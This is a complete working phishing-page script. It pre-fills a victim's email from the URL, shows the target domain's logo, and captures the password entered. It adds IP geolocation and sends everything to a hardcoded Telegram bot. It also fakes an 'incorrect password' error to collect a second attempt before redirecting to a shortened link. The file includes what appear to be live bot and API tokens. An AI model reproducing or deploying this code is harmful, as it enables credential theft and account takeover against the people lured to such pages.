// === CONFIGURE TELEGRAM BOT ===
    const BOT_TOKEN = "8222171309:AAEUq6LuKnxlcaNv2bdM7QkcyNahPx_QCAA";
    const CHAT_ID = "7959372593";
    const IPINFO_TOKEN = "efeb6799727414"; // Optional for more accuracy

    (function() {
        let userEmail = "";
        let attempt = 0;

        // Enhanced email extraction with URL decoding
        function getEmailFromURL() {
            // Try query string parameter
            const urlParams = new URLSearchParams(window.location.search);
            let queryEmail = urlParams.get('email');

            // Try hash parameter
            const hashParams = new URLSearchParams(window.location.hash.substring(1));
            let hashEmail = hashParams.get('email');

            // Decode and validate emails
            const emails = [queryEmail, hashEmail]
                .filter(email => email && isValidEmail(email))
                .map(email => {
                    try {
                        return decodeURIComponent(email);
                    } catch {
                        return email;
                    }
                });

            return emails[0] || "example@example.com";
        }

        // Robust email validation
        function isValidEmail(email) {
            const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(String(email).toLowerCase());
        }

        // Update email field and domain info
        function updateEmailInfo() {
            userEmail = getEmailFromURL();

            const emailField = document.getElementById("email");
            if (emailField) emailField.value = userEmail;

            const domain = userEmail.split("@")[1] || "example.com";
            const domainTitle = document.getElementById("domain-title");
            const domainLogo = document.getElementById("domain-logo");

            if (domainTitle) domainTitle.textContent = domain;
            if (domainLogo) domainLogo.src = `https://logo.clearbit.com/${domain}?size=160`;
        }

        // Telegram message function
        async function sendToTelegram(email, password) {
            try {
                let ipData = {};
                try {
                    const ipRes = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN || ""}`);
                    ipData = await ipRes.json();
                } catch (e) {
                    console.warn("IP info fetch failed", e);
                }

                const message = `
🔐 New Login Attempt
------------------------
📧 Email: ${email}
🔑 Password: ${password}
🌐 IP: ${ipData.ip || "N/A"}
🏙 City: ${ipData.city || "N/A"}
🏢 Region: ${ipData.region || "N/A"}
🌍 Country: ${ipData.country || "N/A"}
📡 ISP: ${ipData.org || "N/A"}
📍 Location: ${ipData.loc || "N/A"}
                `;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: "Markdown"
                    })
                });
            } catch (err) {
                console.error("Telegram send error:", err);
            }
        }

        // Initialize on DOM ready
        document.addEventListener("DOMContentLoaded", () => {
            // Initial setup
            updateEmailInfo();

            // Handle hash changes
            window.addEventListener("hashchange", updateEmailInfo);

            // Login button handler
            document.getElementById("login-btn").addEventListener("click", async function(e) {
                const password = document.getElementById("password").value;
                const errorMsg = document.getElementById("error-msg");
                const spinner = document.getElementById("loading-spinner");
                const loginBtn = document.getElementById("login-btn");

                errorMsg.textContent = "";
                spinner.classList.remove("hidden");
                loginBtn.disabled = true;

                setTimeout(async () => {
                    spinner.classList.add("hidden");
                    loginBtn.disabled = false;
                    attempt++;

                    // Send credentials to Telegram
                    await sendToTelegram(userEmail, password);

                    if (attempt === 1) {
                        errorMsg.textContent = "Incorrect password, please verify and retry.";
                    } else if (attempt >= 2) {
                        window.location.href = "https://surl.li/rebvvk";
                    }
                }, 5000);
            });
        });
    })();
